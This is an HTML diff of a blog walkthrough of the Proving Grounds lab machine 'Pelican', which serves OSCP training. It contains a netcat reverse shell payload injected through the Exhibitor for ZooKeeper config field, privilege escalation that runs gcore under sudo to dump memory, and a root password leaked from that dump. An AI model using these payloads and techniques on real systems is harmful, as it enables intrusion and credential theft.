@@ -4,14 +4,14 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width,initial-scale=1">
     <meta name="color-scheme" content="light dark">
-    <meta name="turbo-cache-control" content="no-cache" data-turbo-track="reload" data-track-token="4.5.3.829724279827">
+    <meta name="turbo-cache-control" content="no-cache" data-turbo-track="reload" data-track-token="4.5.3.829733067554">
 
     <!-- See retype.com -->
     <meta name="generator" content="Retype 4.5.3">
 
     <!-- Primary Meta Tags -->
-    <title>Pelican — OSCP Machine Walkthrough</title>
-    <meta name="title" content="Pelican — OSCP Machine Walkthrough">
+    <title>Pelican - OSCP Machine Walkthrough</title>
+    <meta name="title" content="Pelican - OSCP Machine Walkthrough">
     <meta name="description" content="Platform: Offensive Security Proving Grounds OS: Linux (Debian) Difficulty: Intermediate IP: 192.168.xxx.xxx">
 
     <!-- Canonical -->
@@ -21,28 +21,34 @@
     <!-- Open Graph -->
     <meta property="og:type" content="website">
     <meta property="og:url" content="https://blog.annsh.online/walkthroughs/pelican-walkthrough/">
-    <meta property="og:title" content="Pelican — OSCP Machine Walkthrough">
+    <meta property="og:title" content="Pelican - OSCP Machine Walkthrough">
     <meta property="og:description" content="Platform: Offensive Security Proving Grounds OS: Linux (Debian) Difficulty: Intermediate IP: 192.168.xxx.xxx">
+    <meta property="og:image" content="https://blog.annsh.online/walkthroughs/pelican-zookeeper.png">
+    <meta property="og:image:width" content="1200">
+    <meta property="og:image:height" content="630">
+    <meta property="og:image:alt" content="Pelican - OSCP Machine Walkthrough">
     <meta property="og:site_name" content="Annsh&#x27;s Security Notes">
     <meta property="og:locale" content="en_US">
 
     <!-- Twitter -->
     <meta name="twitter:card" content="summary_large_image">
     <meta name="twitter:url" content="https://blog.annsh.online/walkthroughs/pelican-walkthrough/">
-    <meta name="twitter:title" content="Pelican — OSCP Machine Walkthrough">
+    <meta name="twitter:title" content="Pelican - OSCP Machine Walkthrough">
     <meta name="twitter:description" content="Platform: Offensive Security Proving Grounds OS: Linux (Debian) Difficulty: Intermediate IP: 192.168.xxx.xxx">
+    <meta name="twitter:image" content="https://blog.annsh.online/walkthroughs/pelican-zookeeper.png">
+    <meta name="twitter:image:alt" content="Pelican - OSCP Machine Walkthrough">
 
     <!-- Alternate Markdown -->
     <link rel="alternate" type="text/markdown" href="https://blog.annsh.online/walkthroughs/pelican-walkthrough.md">
 
     <script data-cfasync="false">(function(){var cl=document.documentElement.classList,ls=localStorage.getItem("retype_scheme"),hd=cl.contains("dark"),hl=cl.contains("light"),wm=window.matchMedia&&window.matchMedia("(prefers-color-scheme: dark)").matches;if(ls==="dark"||(!ls&&wm&&!hd&&!hl)){cl.remove("light");cl.add("dark")}else if(ls==="light"||(!ls&&!wm&&!hd&&!hl)){cl.remove("dark");cl.add("light")}})();</script>
 
-    <link href="../../resources/css/retype.css?v=4.5.3.829724279827" rel="stylesheet">
+    <link href="../../resources/css/retype.css?v=4.5.3.829733067554" rel="stylesheet">
 
-    <script data-cfasync="false" src="../../resources/js/config.js?v=4.5.3.829724279827" data-turbo-eval="false" defer></script>
+    <script data-cfasync="false" src="../../resources/js/config.js?v=4.5.3.829733067554" data-turbo-eval="false" defer></script>
     <script data-cfasync="false" src="../../resources/js/retype.js?v=4.5.3" data-turbo-eval="false" defer></script>
-    <script id="lunr-js" data-cfasync="false" src="../../resources/js/lunr.js?v=4.5.3.829724279827" data-turbo-eval="false" defer></script>
-    <script id="prism-js" data-cfasync="false" src="../../resources/js/prism.js?v=4.5.3.829724279827" defer></script>
+    <script id="lunr-js" data-cfasync="false" src="../../resources/js/lunr.js?v=4.5.3.829733067554" data-turbo-eval="false" defer></script>
+    <script id="prism-js" data-cfasync="false" src="../../resources/js/prism.js?v=4.5.3.829733067554" defer></script>
 </head>
 <body>
     <div id="retype-app" class="relative text-base antialiased text-base-text bg-base-bg font-body">
@@ -174,14 +180,14 @@
                 <doc-page-actions></doc-page-actions>
 
                 <!-- Page content  -->
-<h1 id="pelican--oscp-machine-walkthrough">Pelican — OSCP Machine Walkthrough</h1>
+<h1 id="pelican---oscp-machine-walkthrough">Pelican - OSCP Machine Walkthrough</h1>
 <p><strong>Platform:</strong> Offensive Security Proving Grounds<br />
 <strong>OS:</strong> Linux (Debian)<br />
 <strong>Difficulty:</strong> Intermediate<br />
 <strong>IP:</strong> <code translate="no" v-pre>192.168.xxx.xxx</code></p>
 <hr>
 <h2 id="overview">Overview</h2>
-<p>Pelican is a Linux machine that chains together a publicly known Exhibitor-for-ZooKeeper RCE vulnerability to get an initial foothold as a low-privileged user, then abuses a <code translate="no" v-pre>sudo</code> misconfiguration allowing <code translate="no" v-pre>gcore</code> to be run as root — leaking root credentials straight out of process memory.</p>
+<p>Pelican is a Linux machine that chains together a publicly known Exhibitor for ZooKeeper RCE vulnerability to get an initial foothold as a low-privileged user, then abuses a <code translate="no" v-pre>sudo</code> misconfiguration allowing <code translate="no" v-pre>gcore</code> to be run as root -&gt;  leaking root credentials straight out of process memory.</p>
 <hr>
 <h2 id="enumeration">Enumeration</h2>
 <h3 id="nmap">Nmap</h3>
@@ -199,34 +205,34 @@
 </doc-codeblock></div>
 <p>A lot going on here. The key ones to note:</p>
 <ul>
-<li><strong>Port 8080</strong> — Jetty returns a 404, but port 8081 (nginx) redirects straight to <code translate="no" v-pre>http://192.168.241.98:8080/exhibitor/v1/ui/index.html</code>.</li>
-<li><strong>Port 2181</strong> — ZooKeeper, which ties directly into the above.</li>
-<li><strong>Port 631</strong> — CUPS 2.2, no usable exploits on searchsploit.</li>
+<li><strong>Port 8080</strong> -&gt;  Jetty returns a 404, but port 8081 (nginx) redirects straight to <code translate="no" v-pre>http://192.168.241.98:8080/exhibitor/v1/ui/index.html</code>.</li>
+<li><strong>Port 2181</strong> -&gt;  ZooKeeper, which ties directly into the above.</li>
+<li><strong>Port 631</strong> -&gt;  CUPS 2.2, no usable exploits on searchsploit.</li>
 </ul>
 <h3 id="dead-ends">Dead ends</h3>
 <ul>
-<li>SMB (139/445) — no accessible shares.</li>
-<li>CUPS 2.2 — no exploits.</li>
-<li>ZooKeeper (2181) — no direct exploit, but exploitable indirectly via Exhibitor.</li>
-<li>Jetty on 8080 — directory and file fuzzing returned nothing useful.</li>
+<li>SMB (139/445) -&gt;  no accessible shares.</li>
+<li>CUPS 2.2 -&gt;  no exploits.</li>
+<li>ZooKeeper (2181) -&gt;  no direct exploit, but exploitable indirectly via Exhibitor.</li>
+<li>Jetty on 8080 -&gt;  directory and file fuzzing returned nothing useful.</li>
 </ul>
 <hr>
-<h2 id="initial-foothold--exhibitor-for-zookeeper-rce">Initial Foothold — Exhibitor for ZooKeeper RCE</h2>
+<h2 id="initial-foothold----exhibitor-for-zookeeper-rce">Initial Foothold -&gt;  Exhibitor for ZooKeeper RCE</h2>
 <p>Navigating to <code translate="no" v-pre>http://192.168.xxx.xxx:8081</code> redirects to the <strong>Exhibitor for ZooKeeper</strong> web UI on port 8080.</p>
-<p>Exhibitor has a well-known RCE via the <strong>Config</strong> tab — the <code translate="no" v-pre>java.env script</code> field is executed by the ZooKeeper process. Searchsploit has an entry for this.</p>
+<p>Exhibitor has a well-known RCE via the <strong>Config</strong> tab -&gt;  the <code translate="no" v-pre>java.env script</code> field is executed by the ZooKeeper process. Searchsploit has an entry for this.</p>
 <p><strong>Steps:</strong></p>
 <ol>
 <li>Click the <strong>Config</strong> tab in the Exhibitor UI.</li>
 <li>Toggle <strong>Editing ON</strong>.</li>
 <li>In the <code translate="no" v-pre>java.env script</code> field, insert a reverse shell:</li>
 </ol>
-<div id="initial-foothold--exhibitor-for-zookeeper-rce-code-1" class="codeblock-wrapper"><doc-codeblock>
+<div id="initial-foothold----exhibitor-for-zookeeper-rce-code-1" class="codeblock-wrapper"><doc-codeblock>
 <pre translate="no" class="language-bash"><code v-pre class="language-bash">$(/bin/nc -e /bin/sh 192.168.xxx.xxx 4444 &amp;)</code></pre>
 </doc-codeblock></div>
 <ol start="4">
 <li>Set up a listener:</li>
 </ol>
-<div id="initial-foothold--exhibitor-for-zookeeper-rce-code-2" class="codeblock-wrapper"><doc-codeblock>
+<div id="initial-foothold----exhibitor-for-zookeeper-rce-code-2" class="codeblock-wrapper"><doc-codeblock>
 <pre translate="no" class="language-bash"><code v-pre class="language-bash">sudo rlwrap nc -nvlp 4444</code></pre>
 </doc-codeblock></div>
 <ol start="5">
@@ -234,29 +240,25 @@
 </ol>
 <p>The shell connects back and we&#x27;re running as <strong>charles</strong> out of <code translate="no" v-pre>/opt/zookeeper</code>.</p>
 <figure class="content-center">
-    <img src="/assets/img/pelican/foothold.png" alt="Initial shell as charles" class="max-w-full h-auto rounded-image-rounded border-image-border border-image-border-width" />
+    <img src="../pelican-zookeeper.png" alt="Initial shell as charles" class="max-w-full h-auto rounded-image-rounded border-image-border border-image-border-width" width="1284" height="824" />
     <figcaption class="caption">Initial shell as charles</figcaption>
 </figure>
 <hr>
 <h2 id="local-flag">Local Flag</h2>
 <p>Once in, navigate to charles&#x27; home directory and grab the local flag:</p>
-<div id="local-flag-code-1" class="codeblock-wrapper"><doc-codeblock>
-<pre translate="no" class="language-bash"><code v-pre class="language-bash">cd /home/charles
-cat local.txt</code></pre>
-</doc-codeblock></div>
 <p><strong>Local flag:</strong> <code translate="no" v-pre>d5baf9f7aee5740cb3ddb5a6f95b4xxx</code></p>
 <figure class="content-center">
-    <img src="/assets/img/pelican/local-flag.png" alt="Local flag" class="max-w-full h-auto rounded-image-rounded border-image-border border-image-border-width" />
+    <img src="../pelican-local.png" alt="Local flag" class="max-w-full h-auto rounded-image-rounded border-image-border border-image-border-width" width="847" height="539" />
     <figcaption class="caption">Local flag</figcaption>
 </figure>
 <hr>
-<h2 id="privilege-escalation--gcore--process-memory-dump">Privilege Escalation — gcore + Process Memory Dump</h2>
+<h2 id="privilege-escalation----gcore--process-memory-dump">Privilege Escalation -&gt;  gcore + Process Memory Dump</h2>
 <h3 id="sudo--l">sudo -l</h3>
 <div id="sudo--l-code-1" class="codeblock-wrapper"><doc-codeblock>
 <pre translate="no" class="language-none"><code v-pre class="language-none">User charles may run the following commands on pelican:
     (ALL) NOPASSWD: /usr/bin/gcore</code></pre>
 </doc-codeblock></div>
-<p>Charles can run <code translate="no" v-pre>gcore</code> as root — a GNU debugger utility that dumps the memory of a running process to a file. The plan: dump a root-owned process and grep the output for credentials.</p>
+<p>Charles can run <code translate="no" v-pre>gcore</code> as root -&gt;  a GNU debugger utility that dumps the memory of a running process to a file. The plan: dump a root-owned process and grep the output for credentials.</p>
 <h3 id="find-a-root-process-to-dump">Find a root process to dump</h3>
 <div id="find-a-root-process-to-dump-code-1" class="codeblock-wrapper"><doc-codeblock>
 <pre translate="no" class="language-bash"><code v-pre class="language-bash">ps aux | grep -i root</code></pre>
@@ -276,8 +278,12 @@ cat local.txt</code></pre>
 <pre translate="no" class="language-none"><code v-pre class="language-none">001 Password: root:ClogKingpinInning731</code></pre>
 </doc-codeblock></div>
 <figure class="content-center">
-    <img src="/assets/img/pelican/creds.png" alt="Credentials in memory dump" class="max-w-full h-auto rounded-image-rounded border-image-border border-image-border-width" />
-    <figcaption class="caption">Credentials in memory dump</figcaption>
+    <img src="../pelican-dump-1.png" alt="Credentials in memory dump 1" class="max-w-full h-auto rounded-image-rounded border-image-border border-image-border-width" width="1099" height="344" />
+    <figcaption class="caption">Credentials in memory dump 1</figcaption>
+</figure>
+<figure class="content-center">
+    <img src="../pelican-dump-2.png" alt="Credentials in memory dump 2" class="max-w-full h-auto rounded-image-rounded border-image-border border-image-border-width" width="354" height="63" />
+    <figcaption class="caption">Credentials in memory dump 2</figcaption>
 </figure>
 <h3 id="switch-to-root">Switch to root</h3>
 <div id="switch-to-root-code-1" class="codeblock-wrapper"><doc-codeblock>
@@ -292,7 +298,7 @@ cat proof.txt</code></pre>
 </doc-codeblock></div>
 <p><strong>Root flag:</strong> <code translate="no" v-pre>a0cd40939dd948f03097858b6571cxxx</code></p>
 <figure class="content-center">
-    <img src="/assets/img/pelican/proof.png" alt="Proof" class="max-w-full h-auto rounded-image-rounded border-image-border border-image-border-width" />
+    <img src="../pelican-proof.png" alt="Proof" class="max-w-full h-auto rounded-image-rounded border-image-border border-image-border-width" width="663" height="216" />
     <figcaption class="caption">Proof</figcaption>
 </figure>
 <hr>
@@ -308,7 +314,7 @@ cat proof.txt</code></pre>
 <tbody>
 <tr>
 <td>Recon</td>
-<td>Nmap — identified Exhibitor UI on 8081→8080</td>
+<td>Nmap -&gt;  identified Exhibitor UI on 8081→8080</td>
 </tr>
 <tr>
 <td>Foothold</td>
@@ -332,7 +338,7 @@ cat proof.txt</code></pre>
 <hr>
 <h2 id="key-takeaways">Key Takeaways</h2>
 <ul>
-<li><strong>Exhibitor for ZooKeeper</strong> should never be exposed without authentication — the config UI allows arbitrary command execution by design.</li>
+<li><strong>Exhibitor for ZooKeeper</strong> should never be exposed without authentication -&gt;  the config UI allows arbitrary command execution by design.</li>
 <li><strong><code translate="no" v-pre>gcore</code> as sudo</strong> is a classic privesc primitive. Any process running as root can have its memory dumped, and sensitive data (passwords, tokens, keys) often lives unencrypted in process memory.</li>
 <li>Always check <code translate="no" v-pre>ps aux</code> for interesting root processes when you have <code translate="no" v-pre>gcore</code> or <code translate="no" v-pre>ptrace</code> capabilities.</li>
 </ul>
@@ -408,6 +414,6 @@ cat proof.txt</code></pre>
 
     <div id="retype-overlay-target"></div>
 
-        <script data-cfasync="false">window.__DOCS__ = { "title": "Pelican — OSCP Machine Walkthrough", level: 2, icon: "file", hasPrism: true, hasInstagram: false, hasMermaid: false, hasMath: false, tocDepth: 23, "md": "/walkthroughs/pelican-walkthrough.md" }</script>
+        <script data-cfasync="false">window.__DOCS__ = { "title": "Pelican - OSCP Machine Walkthrough", level: 2, icon: "file", hasPrism: true, hasInstagram: false, hasMermaid: false, hasMath: false, tocDepth: 23, "md": "/walkthroughs/pelican-walkthrough.md" }</script>
 </body>
 </html>
